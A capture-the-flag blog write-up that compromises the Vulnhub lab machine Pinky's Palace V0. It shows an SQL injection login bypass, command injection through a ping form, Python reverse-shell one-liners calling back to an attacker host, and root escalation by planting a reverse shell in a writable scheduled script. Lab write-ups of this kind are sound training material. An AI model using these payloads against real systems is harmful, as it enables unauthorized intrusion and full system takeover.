---
layout:     post
title:      "Vulnhub.com - Pinky's-Palace V0"
date:       2018-09-26 0:00:00
author:     "W3ndige"
permalink: /:title/
category: Vulnhub
---

Today we're going to start a series of Vulnhub machines called ***Pinky's-Palace V0***.

{% highlight text %}
The beginning of my Pinky's-Palace Boot2Root VMs.

[+] Difficulty for user: Easy
[+] Difficulty for root: Easy
[+] VirtualBox
[+] .7z File Hash: dfe36828e16bc98b97d9c4b3171a358fffc6497a
{% endhighlight %}

* Author: [@Pink_P4nther](https://twitter.com/Pink_P4nther)
* Download: [https://pinkysplanet.net/pinkys-palace-easy/](https://pinkysplanet.net/pinkys-palace-easy/)

### Solution

Firstly, we're going to start with a `nmap` scan of the target. 

{% highlight text %}
root@kali:~# nmap -sC -sV -sS -A 10.0.0.27
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-25 11:51 EDT
Nmap scan report for 10.0.0.27
Host is up (0.00063s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 7e:0e:97:38:ad:81:72:3e:97:94:b7:ad:22:fc:6a:cc (RSA)
|   256 a8:72:b6:4f:a4:a6:6c:19:dd:49:30:29:c9:8c:7a:31 (ECDSA)
|_  256 60:ac:bf:bd:fb:f7:3b:69:09:16:fa:5c:d3:cc:ba:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Pinky's Palace
MAC Address: 08:00:27:B0:73:BB (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.63 ms 10.0.0.27

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.90 seconds
{% endhighlight %}

As both `ssh` and `http` ports are open, we can start by viewing the content of the webpage hosted on that server.

{% highlight text %}
root@kali:~# curl 10.0.0.27
<html>
	<head>
		<title>Pinky's Palace</title>
	</head>
	<body>
		<h1>Welcome to Pinky's Palace!</h1>
		<p>We are still under development</p>

	</body>
	<style>
		html
		{
			background: #f74bff;
		}
	</style>
</html>
{% endhighlight %}

Nothing useful there, so we can jump into the next step, which is running some scanners. My usual way to go is `nikto` and `gobuster` with `directory-list-2.3-medium.txt` wordlist. 

{% highlight text %}
root@kali:~# nikto -h 10.0.0.27
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.0.27
+ Target Hostname:    10.0.0.27
+ Target Port:        80
+ Start Time:         2018-09-25 11:52:23 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
+ Server leaks inodes via ETags, header found with file /, fields: 0xda 0x562ba174aa704 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: /dev/: Directory indexing found.
+ OSVDB-3092: /dev/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7517 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2018-09-25 11:52:45 (GMT-4) (22 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
{% endhighlight %}

Great, this tool already revealed some interesting directories. Unfortunately, all are empty so let's move on to `gobuster`. 

{% highlight text %}
root@kali:~# gobuster -u http://10.0.0.27 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.0.0.27/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 302,307,200,204,301
=====================================================
/uploads (Status: 301)
/css (Status: 301)
/dev (Status: 301)
/portal_login (Status: 301)
=====================================================
{% endhighlight %}

There it is, another directory called `portal_login`. 

{% highlight text %}
root@kali:~# curl 10.0.0.27/portal_login/
<html>
	<head>
		<title>Login</title>
	</head>
	<body>
		<center><div class="log">
				<center><h2>Pinky's Dashboard Login</h2></center>
			<form action="login.php" method="post">
				Username:
				<input type="text" name="user"/>
				<br>Password:
				<input type="password" name="pass"/>
				<input class="btn" type="submit" value="Login"/>
			</form></center>
	</body>
	<style>
	html
	{
		background: #000000;
	}
	div.log
	{
		background: #f74bff;
		top: 50px;
		border: 200px solid #f74bff;
		font-size: 20px;
	}
	input.btn
	{
		border: 3px solid #000000;
	}
	</style>

</html>
{% endhighlight %}

A little bit of fiddling, and very simple SQL Injection in `user` field allowed us to log into the portal. 

{% highlight text %}
pinky' OR 'a'='a
test
{% endhighlight %}

![Logged in](/img/pinkys-palace/after_logged.png){:class="img-responsive center-block"}

I immediately suspected an ability to inject commands into the `ping` service. 

{% highlight text %}
;whoami
www-data
{% endhighlight %}

Now let's use python to make a reverse shell and get us easier access to commands. 

{% highlight text %}
;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.4",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
{% endhighlight %}

Before submitting the command, we have to set up an listener and then we are all ready.  

{% highlight text %}
root@kali:~# nc -lvp 1337
listening on [any] 1337 ...
10.0.0.27: inverse host lookup failed: Unknown host
connect to [10.0.0.4] from (UNKNOWN) [10.0.0.27] 48194
/bin/sh: 0: can't access tty; job control turned off
$ cat index.html
</www/html/1337pinkyssup3rs3cr3tlair$ cat index.html            
<html>
	<head>
		<title>Pinky's Dashboard</title>
	</head>
	<body>
		<center><div>
			<form action="mau.php" method="post">
				<h2>Ping an IP:</h2><input type="text" name="ip">
				<input type="submit" value="Ping!">
			</form>
			</div></center>
	</body>
	<!-- I've been working on a new web dashboard I plan to have tons of commands!
	 First I added a ping command because its simple! -->
</html>
{% endhighlight %}

Looking around the files in `/var/www/html` directory, I've noticed a file with credentials to `MySQL` server. 

{% highlight text %}
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@pinkys-palace:/var/www/html$ cd portal_login
cd portal_login
www-data@pinkys-palace:/var/www/html/portal_login$ ls -la
ls -la
total 16
drwxr-xr-x 2 root root 4096 Jan 14  2018 .
drwxr-xr-x 7 root root 4096 Jan 14  2018 ..
-rw-r--r-- 1 root root  582 Jan 14  2018 index.html
-rw-r--r-- 1 root root  717 Jan 14  2018 login.php
www-data@pinkys-palace:/var/www/html/portal_login$ cat login.php
cat login.php
<?php
if(empty($_POST['user']) || empty($_POST['pass']))
{
	echo "<p>Incorrect Username or Password</p>";
}
else
{
	$DB_USER = "pinkys_dbu";
	$DB_PASS = "pinkysDBp@55";
	$DB_HOST = "localhost";
	$DB_NAME = "pinkdash_db";
	$user = $_POST['user'];
	$pass = $_POST['pass'];
	$FULLQUERY = "SELECT * FROM users WHERE username='" . $user . "' AND password='" . MD5($pass) . "'";

	$conn = mysqli_connect($DB_HOST, $DB_USER, $DB_PASS);
	$db = mysqli_select_db($conn, $DB_NAME);
	$query = mysqli_query($conn, $FULLQUERY);
	$rows = mysqli_num_rows($query);

	if ($rows == 1)
	{
		header("Location: /1337pinkyssup3rs3cr3tlair/index.html");
	}
	else
	{
		echo "<p>Incorrect Username or Password</p>";
	}
	mysqli_close($conn);
}
{% endhighlight %}

Let's connect to the server and grab the credentials from the `user` table. 

{% highlight text %}
www-data@pinkys-palace:/var/www/html/portal_login$ mysql -u pinkys_dbu -h localhost -p
<l/portal_login$ mysql -u pinkys_dbu -h localhost -p
Enter password: pinkysDBp@55

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 41320
Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1

Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> use pinkdash_db
use pinkdash_db
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [pinkdash_db]> SELECT * FROM users;
SELECT * FROM users;
+------+----------+----------------------------------+
| id   | username | password                         |
+------+----------+----------------------------------+
|    1 | pinky    | 65f7886a4b9fc1214e3c365222321f93 |
+------+----------+----------------------------------+
1 row in set (0.00 sec)
{% endhighlight %}

Great, together with Crackstation we are able to get the plain passowrd for the `pinky` user. 

{% highlight text %}
65f7886a4b9fc1214e3c365222321f93	md5	!!pinkbabygurl!!
{% endhighlight %}

Let's `su` into the user. 

{% highlight text %}
www-data@pinkys-palace:/var/www/html/portal_login$ su pinky
su pinky
Password: !!pinkbabygurl!!
{% endhighlight %}


During usual exploration, I've noticed a strange script `/usr/local/bin/justincase.py`.

{% highlight text %}
pinky@pinkys-palace:~$ find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
/sbin/unix_chkpwd
/var/mail
/var/local
/var/log/mysql
/usr/local
/usr/local/share
/usr/local/share/sgml
/usr/local/share/sgml/declaration
/usr/local/share/sgml/entities
/usr/local/share/sgml/stylesheet
/usr/local/share/sgml/dtd
/usr/local/share/sgml/misc
/usr/local/share/emacs
/usr/local/share/emacs/site-lisp
/usr/local/share/xml
/usr/local/share/xml/declaration
/usr/local/share/xml/entities
/usr/local/share/xml/schema
/usr/local/share/xml/misc
/usr/local/share/ca-certificates
/usr/local/share/man
/usr/local/sbin
/usr/local/etc
/usr/local/include
/usr/local/games
/usr/local/src
/usr/local/lib
/usr/local/lib/python3.5
/usr/local/lib/python3.5/dist-packages
/usr/local/lib/python2.7
/usr/local/lib/python2.7/dist-packages
/usr/local/lib/python2.7/site-packages
/usr/local/bin
/usr/local/bin/justincase.py
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/expiry
/usr/bin/passwd
/usr/bin/chage
/usr/bin/crontab
/usr/bin/chsh
/usr/bin/dotlockfile
/usr/bin/bsd-write
/usr/bin/ssh-agent
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/wall
/run/log/journal
/run/log/journal/8e062ca349a24e31963ed63e0d3ad7d9
/bin/mount
/bin/ping
/bin/umount
/bin/su
{% endhighlight %}

I decided to try my luck and put there reverse shell, as it may be run at specified time intervals. 

{% highlight text %}
pinky@pinkys-palace:~$ cat /usr/local/bin/justincase.py
cat /usr/local/bin/justincase.py
#!/usr/bin/env python

# Soon to be backup script for my palace!

pinky@pinkys-palace:~$ nano /usr/local/bin/justincase.py
pinky@pinkys-palace:~$ cat /usr/local/bin/justincase.py
#!/usr/bin/env python

# Soon to be backup script for my palace!

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.4",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
{% endhighlight %}

After few moments, we got connection from the target. 

{% highlight text %}
root@kali:~# nc -lvp 1338
listening on [any] 1338 ...
10.0.0.27: inverse host lookup failed: Unknown host
connect to [10.0.0.4] from (UNKNOWN) [10.0.0.27] 38640
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cd /root
# ls -la
total 40
drwx------  2 root root  4096 Jan 14  2018 .
drwxr-xr-x 22 root root  4096 Jan 13  2018 ..
-rw-r--r--  1 root root     0 Jan 14  2018 .bash_history
-rw-r--r--  1 root root   570 Jan 14  2018 .bashrc
-rw-------  1 root root     0 Jan 14  2018 .mysql_history
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-r--r--  1 root root    76 Jan 14  2018 root.txt
-rw-r--r--  1 root root    74 Jan 14  2018 .selected_editor
-rw-------  1 root root 12736 Jan 14  2018 .viminfo
# cat root.txt
!!!!!CONGRATS YOU GOT ROOT!!!!!

[+] Flag: d6dc7d5b9f99559fc6c91872bc7020af
{% endhighlight %}